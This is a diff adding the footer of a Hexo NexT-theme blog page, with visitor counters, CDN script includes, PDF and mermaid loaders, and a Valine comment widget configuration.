+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('div.pdf').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/pdfobject@2/pdfobject.min.js', () => {
+    document.querySelectorAll('div.pdf').forEach(element => {
+      PDFObject.embed(element.getAttribute('target'), element, {
+        pdfOpenParams: {
+          navpanes: 0,
+          toolbar: 0,
+          statusbar: 0,
+          pagemode: 'thumbs',
+          view: 'FitH'
+        },
+        PDFJS_URL: '/lib/pdf/web/viewer.html',
+        height: element.getAttribute('height') || '800px'
+      });
+    });
+  }, window.PDFObject);
+}
+</script>
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme: 'forest',
+      logLevel: 3,
+      flowchart: { curve: 'linear' },
+      gantt: { axisFormat: '%m/%d/%Y' },
+      sequence: { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'iEBFuhVyk4tuhVYctQ265uid-gzGzoHsz',
+    appKey: 'KGjOktrtgSEWK1v9DYA3T3Az',
+    placeholder: "Just go go",
+    avatar: 'retro',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: 'zh-cn' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
